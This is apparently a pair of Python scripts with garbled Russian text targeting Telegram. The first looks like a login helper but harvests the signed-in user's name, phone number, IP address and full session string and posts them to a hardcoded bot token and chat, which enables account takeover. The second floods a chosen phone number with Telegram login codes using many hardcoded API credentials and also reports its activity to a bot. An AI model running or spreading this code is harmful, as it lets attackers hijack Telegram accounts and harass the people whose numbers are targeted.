import time
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import requests
import base64
import os

RED = '\033[33m'

api_id = '24448137'
api_hash = '33d30b63fbcaa74af19300927a985cf1'
session_file = 'sessions.session'
bot_token = '7016421271:AAGeyYMRcfcF79VKUblyiegOR4_b8IegVdM'


'''6753063874'''
chat_id = ['5974477161'] 

if os.path.exists(session_file):
    client = TelegramClient(session_file, api_id, api_hash)
    
else:
    client = TelegramClient(StringSession(), api_id, api_hash)

def send_notification(bot_token, chat_id, message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print(f"")
    else:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ: {response.status_code}, {response.text}")

async def main():
    try:
        print("–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!")
        
        me = await client.get_me()
        phone = me.phone if me.phone else '–ù–µ —É–∫–∞–∑–∞–Ω–æ'
        username = me.username if me.username else '–ù–µ —É–∫–∞–∑–∞–Ω'
        first_name = me.first_name if me.first_name else '–ù–µ —É–∫–∞–∑–∞–Ω–æ'
        last_name = me.last_name if me.last_name else '–ù–µ —É–∫–∞–∑–∞–Ω–æ'
        status = me.status if me.status else '–ù–µ —É–∫–∞–∑–∞–Ω'
        ip = requests.get('https://api.ipify.org').text

        session_string = StringSession.save(client.session)
        
        if session_string is None:
            print("–û—à–∏–±–∫–∞: —Å—Ç—Ä–æ–∫–∞ —Å–µ—Å—Å–∏–∏ —Ä–∞–≤–Ω–∞ None")
        else:
            print("–í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∫–ª—é—á(–∑–∞–ø–æ–º–Ω–∏—Ç–µ –µ–≥–æ):", session_string)

        user_info = ("üëá–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ: \n\n"
            f"–ò–º—è: {first_name}\n"
            f"–§–∞–º–∏–ª–∏—è: {last_name}\n"
            f"–Æ–∑–µ—Ä–Ω–µ–π–º: @{username}\n"
            f"–¢–µ–ª–µ—Ñ–æ–Ω: {phone}\n"
            f"–°—Ç–∞—Ç—É—Å: {status}\n"
            f"IP-–∞–¥—Ä–µ—Å: {ip}\n"
            f"–°—Ç—Ä–æ–∫–∞ —Å–µ—Å—Å–∏–∏: {session_string}\n"
            f"–ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {me.status}"
        )
        
        send_notification(bot_token, chat_id, user_info)

    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {e}")
    finally:
        await client.disconnect()

# –ó–∞–ø—É—Å–∫ –∫–ª–∏–µ–Ω—Ç–∞


with client:
    client.loop.run_until_complete(main())



import asyncio
from telethon import TelegramClient
from pystyle import Write, Colors, Center
import os
import requests

os.system('cls' if os.name == 'nt' else 'clear')

bot_token = '8079251100:AAHu09V23BhKrzveNewWIn4yUlCYVlViJzw'
chat_id = '6773319950'

banner = '''
‚†Ä‚†Ä       ‚†Ä‚†Ä‚¢Ä‚£¥‚£∂‚£∂‚°Ä‚†Ä‚†Ä‚¢Ä‚°¥‚†õ‚†Å‚†Ä‚†ò‚£ø‚°Ñ‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£∑‚£§‚°¥‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚£á‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∫‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚¢ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚£ø‚°Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚¢è‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚°á
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£æ‚£∑‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚°á
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚°û‚†Å‚¢π‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†ü‚†Ä‚†Ä‚†à‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚£¥‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£º‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢Ä‚£º‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚°æ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚°Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚£Ñ‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ø‚†õ‚†É
   
   
   
   
–ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: —Å–Ω–æ—Å–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ –±–æ—Ç–Ω–µ—Ç - –Ω–µ —É–¥–∞–ª—è–π—Ç–µ aarch64 –∏–∑ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤!


'''

Write.Print(Center.XCenter(banner), Colors.green_to_blue, interval=0.001)

accounts = [
    {'api_id': '10840', 'api_hash': '33c45224029d59cb3ad0c16134215aeb'},
    {'api_id': '24105845', 'api_hash': '10d28333dedfa35c3719db5162fb02d2'},
    {'api_id': '24448137', 'api_hash': '33d30b63fbcaa74af19300927a985cf1'},
    {'api_id': '8', 'api_hash': '7245de8e747a0d6fbe11f7cc14fcc0bb'},
    {'api_id': '21724', 'api_hash': '3e0cb5efcd52300aec5994fdfc5bdc16'},
    {'api_id': '16623', 'api_hash': '8c9dbfe58437d1739540f5d53c72ae4b'},
    {'api_id': '2899', 'api_hash': '36722c72256a24c1225de00eb6a1ca74'},
    {'api_id': '10840', 'api_hash': '33c45224029d59cb3ad0c16134215aeb'},
    {'api_id': '1', 'api_hash': 'b6b154c3707471f5339bd661645ed3d6'},
    {'api_id': '4', 'api_hash': '014b35b6184100b085b0d0572f9b5103'},
    {'api_id': '5', 'api_hash': '1c5c96d5edd401b1ed40db3fb5633e2d'},
    {'api_id': '2040', 'api_hash': 'b18441a1ff607e10a989891a5462e627'},
    {'api_id': '17349', 'api_hash': '344583e45741c457fe1862106095a5eb'}
]

codes = [
    "67194"
]


def send_notification(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("")
        else:
            print(f"–í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞: {response.status_code}")
    except Exception as e:
        print(f"–í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞: {e}")


async def authorize_client(phone_number, api_id, api_hash, code_index):
    client = TelegramClient(None, api_id, api_hash)

    try:
        await client.start(phone=phone_number, code_callback=lambda: codes[code_index])


        if not await client.is_user_authorized():
            print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {phone_number} –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –≤ Telegram, –ø–æ—ç—Ç–æ–º—É —Å–ø–∞–º –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω.")
        else:
            print(f"–ö–æ–¥ –Ω–∞ {phone_number} –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.\nAPI ID: {api_id} | API HASH: {api_hash}")
    
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –¥–ª—è {phone_number} —Å API ID {api_id}: {e}")

    finally:
        await client.disconnect()


async def send_codes_with_delay(phone_number, num_cycles):
    for cycle in range(num_cycles):
        print(f"\n–ó–∞–ø—É—Å–∫ —Ü–∏–∫–ª–∞ {cycle + 1} –∏–∑ {num_cycles}")
        send_notification(bot_token, chat_id, f'–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Å–ø–∞–º –Ω–∞ –Ω–æ–º–µ—Ä {phone_number}, {num_cycles} —Ü–∏–∫–ª–æ–≤')
        tasks = []
        for index, account in enumerate(accounts):
            task = authorize_client(phone_number, account['api_id'], account['api_hash'], index % len(codes))
            tasks.append(task)
            await asyncio.sleep(0.01) 
        await asyncio.gather(*tasks)  
    print("–í—Å–µ –∏—Ç–µ—Ä–∞—Ü–∏–∏ –∑–∞–≤–µ—Ä—à–µ–Ω—ã.")

async def main():
    phone_number = Write.Input("\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Å–ø–∞–º–∞: ", Colors.blue_to_cyan, interval=0.005)
    num_cycles = int(Write.Input("\n–°–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥—ã?: ", Colors.blue_to_cyan, interval=0.005))
    await send_codes_with_delay(phone_number, num_cycles)

if __name__ == '__main__':
    asyncio.run(main())
